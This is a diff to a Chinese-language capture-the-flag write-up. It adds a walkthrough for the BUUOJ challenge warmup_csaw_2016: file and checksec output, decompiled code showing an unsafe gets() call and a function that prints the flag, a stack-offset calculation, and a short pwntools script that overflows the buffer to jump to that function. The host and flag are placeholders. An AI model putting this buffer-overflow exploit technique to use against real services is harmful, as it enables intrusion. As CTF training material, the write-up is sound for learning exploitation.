@@ -57,7 +57,7 @@ flag{<flag here>}
 先使用 `file` 命令查看文件类型，发现是一个 ELF 64 位程序
 
 ```shell
-┌──(hervey㉿Hervey)-[/mnt/c/Users/zhwaa/Downloads]
+┌──(hervey㉿Hervey)-[~/Downloads]
 └─$ file pwn1
 pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped
 ```
@@ -65,13 +65,13 @@ pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, i
 接着使用 `checksec` 命令识别安全属性
 
 ```shell
-┌──(hervey㉿Hervey)-[/mnt/c/Users/zhwaa/Downloads]
+┌──(hervey㉿Hervey)-[~/Downloads]
 └─$ checksec --file=pwn1
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   64 Symbols        No    0               1               pwn1
 ```
 
-可以发现无任何栈保护
+可以发现无栈保护
 
 使用 IDA 64 进行逆向
 
@@ -155,6 +155,103 @@ usr
 var
 $ cat flag
 flag{<flag here>}
+```
+
+进而获得 flag
+
+### [PWN-warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)
+
+下载后获得文件 warmup_csaw_2016
+
+先使用 `file` 命令查看文件类型，发现是一个 ELF 64 位程序
+
+```shell
+┌──(hervey㉿Hervey)-[~/Downloads]
+└─$ file ./warmup_csaw_2016
+./warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped
+```
+
+接着使用 `checksec` 命令识别安全属性
+
+```shell
+┌──(hervey㉿ZHW)-[~/Downloads]
+└─$ checksec --file=warmup_csaw_2016
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               warmup_csaw_2016
+```
+
+可以发现无栈保护
+
+使用 IDA 64 进行逆向
+
+`main()` 函数
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  char s[64]; // [rsp+0h] [rbp-80h] BYREF
+  char v5[64]; // [rsp+40h] [rbp-40h] BYREF
+
+  write(1, "-Warm Up-\n", 0xAuLL);
+  write(1, "WOW:", 4uLL);
+  sprintf(s, "%p\n", sub_40060D);
+  write(1, s, 9uLL);
+  write(1, ">", 1uLL);
+  return gets(v5);
+}
+```
+
+发现有一个 `gets()` 函数，推测应该用栈溢出的方法解决此问题
+
+接下来查看 `v5` 的位置，在 IDA 中双击进入
+
+```asm
+-0000000000000042 db ? ; undefined
+-0000000000000041 db ? ; undefined
+-0000000000000040 var_40 db 64 dup(?)
++0000000000000000  s db 8 dup(?)
++0000000000000008  r db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+可以知道离返回地址的距离为 `0x40 + 0x8`
+
+同时我们还能找到一个 `sub_40060D` 函数
+
+```c
+int sub_40060D()
+{
+  return system("cat flag.txt");
+}
+```
+
+这个函数的地址在 `0x40060D`
+
+通过调用这个函数就可以获取 flag
+
+由此我们可以写出脚本
+
+```python
+from pwn import *
+p = remote("<IP Address>", <Port>)
+payload = b'A' * (0x40 + 0x8) + p64(0x40060D)
+p.sendline(payload)
+p.interactive()
+```
+
+运行该脚本，获取 flag
+
+```shell
+┌──(hervey㉿ZHW)-[~/Downloads]
+└─$ python3 ./sol.py
+[+] Opening connection to <IP Address> on port <Port>: Done
+[*] Switching to interactive mode
+-Warm Up-
+WOW:0x40060d
+>flag{<flag here>}
+[*] Got EOF while reading in interactive
+$
 ```
 
 进而获得 flag
